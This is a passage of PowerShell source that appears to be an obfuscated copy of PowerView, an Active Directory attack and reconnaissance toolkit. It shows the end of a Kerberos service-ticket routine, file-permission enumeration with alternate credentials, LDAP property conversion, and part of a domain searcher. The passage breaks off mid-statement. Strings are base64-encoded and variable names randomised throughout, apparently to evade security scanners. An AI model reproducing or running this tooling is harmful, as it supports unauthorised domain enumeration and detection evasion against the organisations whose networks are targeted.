DomainSPNTicket -OutputFormat $OutputFormat
    }
    END {
        if 
(${bfcebd26467f492297f5dcbf75cad4ab}) {
            Invoke-
RevertToSelf -TokenHandle ${bfcebd26467f492297f5dcbf75cad4ab}
        
}
    }
}
function Get-PathAcl {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    
[CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('FullName')]
        [String[]]
        $Path,
   
     [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
function Convert-FileRight {
            [CmdletBinding()]
            
Param(
                [Int]
                $FSR
            )
         
   ${248b47f5ed5a415ba0202c669d4f9627} = @{
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADgAMAAwADAAMAAwADAAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBlAG4AZQByAGkAYwBSAGUAYQBkAA==')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBlAG4AZQByAGkAYwBXAHIAaQB0AGUA')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBlAG4AZQByAGkAYwBFAHgAZQBjAHUAdABlAA==')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMgAwADAAMAAwADAAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBhAHgAaQBtAHUAbQBBAGwAbABvAHcAZQBkAA==')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMQAwADAAMAAwADAAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBjAGMAZQBzAHMAUwB5AHMAdABlAG0AUwBlAGMAdQByAGkAdAB5AA==')))
       
         [uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAxADAAMAAwADAAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB5AG4AYwBoAHIAbwBuAGkAegBlAA==')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADgAMAAwADAAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwByAGkAdABlAE8AdwBuAGUAcgA=')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADQAMAAwADAAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwByAGkAdABlAEQAQQBDAA==')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADIAMAAwADAAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAGEAZABDAG8AbgB0AHIAbwBsAA==')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADEAMAAwADAAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABlAGwAZQB0AGUA')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAxADAAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwByAGkAdABlAEEAdAB0AHIAaQBiAHUAdABlAHMA')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADgAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAGEAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADQAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABlAGwAZQB0AGUAQwBoAGkAbABkAA==')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RQB4AGUAYwB1AHQAZQAvAFQAcgBhAHYAZQByAHMAZQA=')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwByAGkAdABlAEUAeAB0AGUAbgBkAGUAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')
))
                [uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAGEAZABFAHgAdABlAG4AZABlAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwA=')))
   
             [uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBwAHAAZQBuAGQARABhAHQAYQAvAEEAZABkAFMAdQBiAGQAaQByAGUAYwB0AG8Acg
B5AA==')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwByAGkAdABlAEQAYQB0AGEALwBBAGQAZABGAGkAbABlAA==')))
               
 [uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAGEAZABEAGEAdABhAC8ATABpAHMAdABEAGkAcgBlAGMAdABvAHIAeQA=')))
   
         }
            ${8397b545eff34bb09e238de55eb60bac} = @{
       
         [uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADEAZgAwADEAZgBmAA=='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgB1AGwAbABDAG8AbgB0AHIAbwBsAA==')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMwAwADEAYgBmAA=='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBvAGQAaQBmAHkA')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMgAwADAAYQA5AA=='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAGEAZABBAG4AZABFAHgAZQBjAHUAdABlAA==')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMgAwADEAOQBmAA=='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAGEAZABBAG4AZABXAHIAaQB0AGUA')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMgAwADAAOAA5AA=='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAGEAZAA=')))
                
[uint32]$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('MAB4ADAAMAAwADEAMQA2AA=='))) = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VwByAGkAdABlAA==')))
            }
            
${0dee9d1e6f2048d3855a203abdbb7fc4} = @()
            
${0dee9d1e6f2048d3855a203abdbb7fc4} += 
${8397b545eff34bb09e238de55eb60bac}.Keys | ForEach-Object {
          
                    if (($FSR -band $_) -eq $_) {
                    
            ${8397b545eff34bb09e238de55eb60bac}[$_]
                  
              $FSR = $FSR -band (-not $_)
                            
  }
                            }
            
${0dee9d1e6f2048d3855a203abdbb7fc4} += 
${248b47f5ed5a415ba0202c669d4f9627}.Keys | Where-Object { $FSR -band 
$_ } | ForEach-Object { ${248b47f5ed5a415ba0202c669d4f9627}[$_] }
    
        (${0dee9d1e6f2048d3855a203abdbb7fc4} | Where-Object {$_}) -
join ','
        }
        ${862f5010d4134855b91a80cc000960e1} = @{}
   
     if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${862f5010d4134855b91a80cc000960e1}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${6a36a79de18f43b1a0a59794f4ad66dc} = @{}
    }
    PROCESS {
        
ForEach (${2b1cd794316846babc6cf4a4a6510811} in $Path) {
            
try {
                if ((${2b1cd794316846babc6cf4a4a6510811} -Match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                    
${9275e39a12134a3fa8e1806664964155} = (New-Object System.Uri
(${2b1cd794316846babc6cf4a4a6510811})).Host
                    if 
(-not ${6a36a79de18f43b1a0a59794f4ad66dc}
[${9275e39a12134a3fa8e1806664964155}]) {
                        
Add-RemoteConnection -ComputerName 
${9275e39a12134a3fa8e1806664964155} -Credential $Credential
          
              ${6a36a79de18f43b1a0a59794f4ad66dc}
[${9275e39a12134a3fa8e1806664964155}] = $True
                    }
   
             }
                ${3a28628adb834b7fb0df733dfd2a8fcb} = 
Get-Acl -Path ${2b1cd794316846babc6cf4a4a6510811}
                
${3a28628adb834b7fb0df733dfd2a8fcb}.GetAccessRules($True, $True, 
[System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
   
                 ${8590c8297802483ca0127e70b4ad199d} = 
$_.IdentityReference.Value
                    $Name = ConvertFrom-
SID -ObjectSID ${8590c8297802483ca0127e70b4ad199d} 
@862f5010d4134855b91a80cc000960e1
                    
${6f675a112d04499c838f32bbba9fa15a} = New-Object PSObject
            
        ${6f675a112d04499c838f32bbba9fa15a} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UABhAHQAaAA='))) 
${2b1cd794316846babc6cf4a4a6510811}
                    
${6f675a112d04499c838f32bbba9fa15a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBpAGwAZQBTAHkAcwB0AGUAbQBSAGkAZwBoAHQAcwA='))) (Convert-
FileRight -FSR $_.FileSystemRights.value__)
                    
${6f675a112d04499c838f32bbba9fa15a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAA=='))) $Name
         
           ${6f675a112d04499c838f32bbba9fa15a} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFMASQBEAA=='))) 
${8590c8297802483ca0127e70b4ad199d}
                    
${6f675a112d04499c838f32bbba9fa15a} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBjAGMAZQBzAHMAQwBvAG4AdAByAG8AbABUAHkAcABlAA=='))) 
$_.AccessControlType
                    
${6f675a112d04499c838f32bbba9fa15a}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBGAGkAbABlAEEAQwBMAA=='))))
              
      ${6f675a112d04499c838f32bbba9fa15a}
                }
           
 }
            catch {
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAFAAYQB0AGgAQQBjAGwAXQAgAGUAcgByAG8AcgA6ACAAJABfAA==')
))
            }
        }
    }
    END {
        
${6a36a79de18f43b1a0a59794f4ad66dc}.Keys | Remove-RemoteConnection
   
 }
}
function Convert-LDAPProperty {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('System.Management.Automation.PSCustomObject')]
    [CmdletBinding
()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline 
= $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )
  
  ${11b596efcda74084863b5a6a56c20f17} = @{}
    
$Properties.PropertyNames | ForEach-Object {
        if ($_ -ne 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YQBkAHMAcABhAHQAaAA=')))) {
            if (($_ -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBiAGoAZQBjAHQAcwBpAGQA')))) -or ($_ -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBpAGQAaABpAHMAdABvAHIAeQA='))))) {
                
${11b596efcda74084863b5a6a56c20f17}[$_] = $Properties[$_] | 
ForEach-Object { (New-Object 
System.Security.Principal.SecurityIdentifier($_, 0)).Value }
         
   }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('ZwByAG8AdQBwAHQAeQBwAGUA')))) {
        
        ${11b596efcda74084863b5a6a56c20f17}[$_] = $Properties[$_][0] 
-as ${c9d4141d47154d848e277e98f31bc056}
            }
            
elseif ($_ -eq $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA==')))) {
                
${11b596efcda74084863b5a6a56c20f17}[$_] = $Properties[$_][0] -as 
${9fc62d3e16bf403bbb2b0af016b23f6b}
            }
            elseif 
($_ -eq $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA=')))) {
    
            ${11b596efcda74084863b5a6a56c20f17}[$_] = (New-Object 
Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ 
-eq $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA')))) {
            
    ${11b596efcda74084863b5a6a56c20f17}[$_] = $Properties[$_][0] -as 
${9ad57110e7184c649f993e0b08059b53}
            }
            elseif 
($_ -eq $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('bgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByAA==')))) {
    
            ${97d1ebaf40594734ac9fb0578dfb911f} = New-Object 
Security.AccessControl.RawSecurityDescriptor -ArgumentList 
$Properties[$_][0], 0
                if 
(${97d1ebaf40594734ac9fb0578dfb911f}.Owner) {
                    
${11b596efcda74084863b5a6a56c20f17}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwB3AG4AZQByAA==')))] = ${97d1ebaf40594734ac9fb0578dfb911f}.Owner
  
              }
                if 
(${97d1ebaf40594734ac9fb0578dfb911f}.Group) {
                    
${11b596efcda74084863b5a6a56c20f17}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAA==')))] = ${97d1ebaf40594734ac9fb0578dfb911f}.Group
  
              }
                if 
(${97d1ebaf40594734ac9fb0578dfb911f}.DiscretionaryAcl) {
             
       ${11b596efcda74084863b5a6a56c20f17}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABpAHMAYwByAGUAdABpAG8AbgBhAHIAeQBBAGMAbAA=')))] = 
${97d1ebaf40594734ac9fb0578dfb911f}.DiscretionaryAcl
                
}
                if (${97d1ebaf40594734ac9fb0578dfb911f}.SystemAcl) 
{
                    ${11b596efcda74084863b5a6a56c20f17}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB5AHMAdABlAG0AQQBjAGwA')))] = 
${97d1ebaf40594734ac9fb0578dfb911f}.SystemAcl
                }
       
     }
            elseif ($_ -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA==')))) {
                if 
($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                
    ${11b596efcda74084863b5a6a56c20f17}[$_] = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TgBFAFYARQBSAA==')))
                }
                else {
        
            ${11b596efcda74084863b5a6a56c20f17}[$_] = 
[datetime]::fromfiletime($Properties[$_][0])
                }
        
    }
            elseif ( ($_ -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bABhAHMAdABsAG8AZwBvAG4A')))) -or ($_ -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA')))) -or ($_ -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cAB3AGQAbABhAHMAdABzAGUAdAA=')))) -or ($_ -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bABhAHMAdABsAG8AZwBvAGYAZgA=')))) -or ($_ -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YgBhAGQAUABhAHMAcwB3AG8AcgBkAFQAaQBtAGUA')))) ) {
                
if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
            
        ${e8bb8df88abb43dd8c585feeaac29ef5} = $Properties[$_][0]
     
               [Int32]${4ebf41d1d1db43aebf951455cc8a406e} = 
${e8bb8df88abb43dd8c585feeaac29ef5}.GetType().InvokeMember
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SABpAGcAaABQAGEAcgB0AA=='))), 
[System.Reflection.BindingFlags]::GetProperty, $Null, 
${e8bb8df88abb43dd8c585feeaac29ef5}, $Null)
                    
[Int32]${ee8f3cd252af4be3b8b75b104acf0109}  = 
${e8bb8df88abb43dd8c585feeaac29ef5}.GetType().InvokeMember
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABvAHcAUABhAHIAdAA='))),  
[System.Reflection.BindingFlags]::GetProperty, $Null, 
${e8bb8df88abb43dd8c585feeaac29ef5}, $Null)
                    
${11b596efcda74084863b5a6a56c20f17}[$_] = ([datetime]::FromFileTime
([Int64]($([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f 
${4ebf41d1d1db43aebf951455cc8a406e}, 
${ee8f3cd252af4be3b8b75b104acf0109})))
                }
              
  else {
                    ${11b596efcda74084863b5a6a56c20f17}[$_] 
= ([datetime]::FromFileTime(($Properties[$_][0])))
                }
  
          }
            elseif ($Properties[$_][0] -is 
[System.MarshalByRefObject]) {
                
${e2d8d3898afa4b699003b1b2db83820f} = $Properties[$_]
                
try {
                    ${e8bb8df88abb43dd8c585feeaac29ef5} = 
${e2d8d3898afa4b699003b1b2db83820f}[$_][0]
                    
[Int32]${4ebf41d1d1db43aebf951455cc8a406e} = 
${e8bb8df88abb43dd8c585feeaac29ef5}.GetType().InvokeMember
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SABpAGcAaABQAGEAcgB0AA=='))), 
[System.Reflection.BindingFlags]::GetProperty, $Null, 
${e8bb8df88abb43dd8c585feeaac29ef5}, $Null)
                    
[Int32]${ee8f3cd252af4be3b8b75b104acf0109}  = 
${e8bb8df88abb43dd8c585feeaac29ef5}.GetType().InvokeMember
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABvAHcAUABhAHIAdAA='))),  
[System.Reflection.BindingFlags]::GetProperty, $Null, 
${e8bb8df88abb43dd8c585feeaac29ef5}, $Null)
                    
${11b596efcda74084863b5a6a56c20f17}[$_] = [Int64]
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f 
${4ebf41d1d1db43aebf951455cc8a406e}, 
${ee8f3cd252af4be3b8b75b104acf0109})
                }
                
catch {
                    Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBDAG8AbgB2AGUAcgB0AC0ATABEAEEAUABQAHIAbwBwAGUAcgB0AHkAXQAgAGUAcg
ByAG8AcgA6ACAAJABfAA==')))
                    
${11b596efcda74084863b5a6a56c20f17}[$_] = 
${e2d8d3898afa4b699003b1b2db83820f}[$_]
                }
            
}
            elseif ($Properties[$_].count -eq 1) {
                
${11b596efcda74084863b5a6a56c20f17}[$_] = $Properties[$_][0]
         
   }
            else {
                
${11b596efcda74084863b5a6a56c20f17}[$_] = $Properties[$_]
            
}
        }
    }
    try {
        New-Object -TypeName PSObject -
Property ${11b596efcda74084863b5a6a56c20f17}
    }
    catch {
        
Write-Warning $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBDAG8AbgB2AGUAcgB0AC0ATABEAEEAUABQAHIAbwBwAGUAcgB0AHkAXQAgAEUAcg
ByAG8AcgAgAHAAYQByAHMAaQBuAGcAIABMAEQAQQBQACAAcAByAG8AcABlAHIAdABpAG
UAcwAgADoAIAAkAF8A')))
    }
}
function Get-DomainSearcher {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding
()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        
[ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        
[ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
  
      $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String
[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        
[Alias('ADSPath')]
        [String]
        $SearchBase,
        
[ValidateNotNullOrEmpty()]
        [String]
        
$SearchBasePrefix,
        [ValidateNotNullOrEmpty()]
        [Alias
('DomainController')]
        [String]
        $Server,
        
[ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        
$SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit = 120,
        
[ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        
[String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
   
     [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            
$TargetDomain = $Domain
            if ($ENV:USERDNSDOMAIN -and 
($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                $UserDomain = 
$ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and 
($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
                 
   ${22e940cb80024d67823f0308194b2745} = "$($ENV:LOGONSERVER -
replace '\\','').$UserDomain"
                }
            }
        
}
        elseif ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            
${61eb65bd64ad43a9823b9583abed7b7e} = Get-Domain -Credential 
$Credential
            ${22e940cb80024d67823f0308194b2745} = 
(${61eb65bd64ad43a9823b9583abed7b7e}.PdcRoleOwner).Name
            
$TargetDomain = ${61eb65bd64ad43a9823b9583abed7b7e}.Name
        }
    
    elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne 
'')) {
            $TargetDomain = $ENV:USERDNSDOMAIN
            if 
($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and 
$TargetDomain) {
                ${22e940cb80024d67823f0308194b2745} 
= "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
  
      }
        else {
            write-verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZwBlAHQALQBkAG8AbQBhAGkAbgA=')))
            
${61eb65bd64ad43a9823b9583abed7b7e} = Get-Domain
            
${22e940cb80024d67823f0308194b2745} = 
(${61eb65bd64ad43a9823b9583abed7b7e}.PdcRoleOwner).Name
            
$TargetDomain = ${61eb65bd64ad43a9823b9583abed7b7e}.Name
        }
    
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            
${22e940cb80024d67823f0308194b2745} = $Server
        }
        
${c5314e49bd6f475abdbfa399665e1364} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUAA6AC8ALwA=')))
        if 
(${22e940cb80024d67823f0308194b2745} -and 
(${22e940cb80024d67823f0308194b2745}.Trim() -ne '')) {
            
${c5314e49bd6f475abdbfa399665e1364} += 
${22e940cb80024d67823f0308194b2745}
            if ($TargetDomain) {
  
              ${c5314e49bd6f475abdbfa399665e1364} += '/'
            
}
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQBQAHIAZQBmAGkAeAA=')))]) {
            
${c5314e49bd6f475abdbfa399665e1364} += $SearchBasePrefix + ','
       
 }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) {
            if ($SearchBase -
Match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XgBHAEMAOgAvAC8A')))) {
                
${7ad98b42cd2445ecb64347a50a5e7833} = $SearchBase.ToUpper().Trim
('/')
                ${c5314e49bd6f475abdbfa399665e1364} = ''
        
    }
            else {
                if ($SearchBase -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBMAEQAQQBQADoALwAvAA==')))) {
                    if ($SearchBase 
-match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAuACsALwAuACsA')))) 
{
                        ${c5314e49bd6f475abdbfa399665e1364} = ''
    
                    ${7ad98b42cd2445ecb64347a50a5e7833} = 
$SearchBase
                    }
                    else {
           
             ${7ad98b42cd2445ecb64347a50a5e7833} = 
$SearchBase.SubString(7)
                    }
                }
       
         else {
                    
${7ad98b42cd2445ecb64347a50a5e7833} = $SearchBase
                }
   
         }
        }
        else {
            if ($TargetDomain -and 
($TargetDomain.Trim() -ne '')) {
                
${7ad98b42cd2445ecb64347a50a5e7833} = "DC=$($TargetDomain.Replace
('.', $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('LABEAEMAPQA=')))))"
            }
       
 }
        ${c5314e49bd6f475abdbfa399665e1364} += 
${7ad98b42cd2445ecb64347a50a5e7833}
        Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAZQBhAHIAYwBoAGUAcgBdACAAcwBlAGEAcg
BjAGgAIABiAGEAcwBlADoAIAAkAHsAYwA1ADMAMQA0AGUANAA5AGIAZAA2AGYANAA3AD
UAYQBiAGQAYgBmAGEAMwA5ADkANgA2ADUAZQAxADMANgA0AH0A')))
        if 
($Credential -ne [Management.Automation.PSCredential]::Empty) {
      
      Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAZQBhAHIAYwBoAGUAcgBdACAAVQBzAGkAbg
BnACAAYQBsAHQAZQByAG4AYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABmAG
8AcgAgAEwARABBAFAAIABjAG8AbgBuAGUAYwB0AGkAbwBuAA==')))
            
${61eb65bd64ad43a9823b9583abed7b7e} = New-Object 
DirectoryServices.DirectoryEntry
(${c5314e49bd6f475abdbfa399665e1364}, $Credential.UserName, 
$Credential.GetNetworkCredential().Password)
            
${148160fac3314bdc82ee9f4c583c0c4a} = New-Object 
System.DirectoryServices.DirectorySearcher
(${61eb65bd64ad43a9823b9583abed7b7e})
        }
        else {
         
   ${148160fac3314bdc82ee9f4c583c0c4a} = New-Object 
System.DirectoryServices.DirectorySearcher
([ADSI]${c5314e49bd6f475abdbfa399665e1364})
        }
        
${148160fac3314bdc82ee9f4c583c0c4a}.PageSize = $ResultPageSize
       
 ${148160fac3314bdc82ee9f4c583c0c4a}.SearchScope = $SearchScope
      
  ${148160fac3314bdc82ee9f4c583c0c4a}.CacheResults = $False
        
${148160fac3314bdc82ee9f4c583c0c4a}.ReferralChasing = 
[System.DirectoryServices.ReferralChasingOption]::All
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) {
            
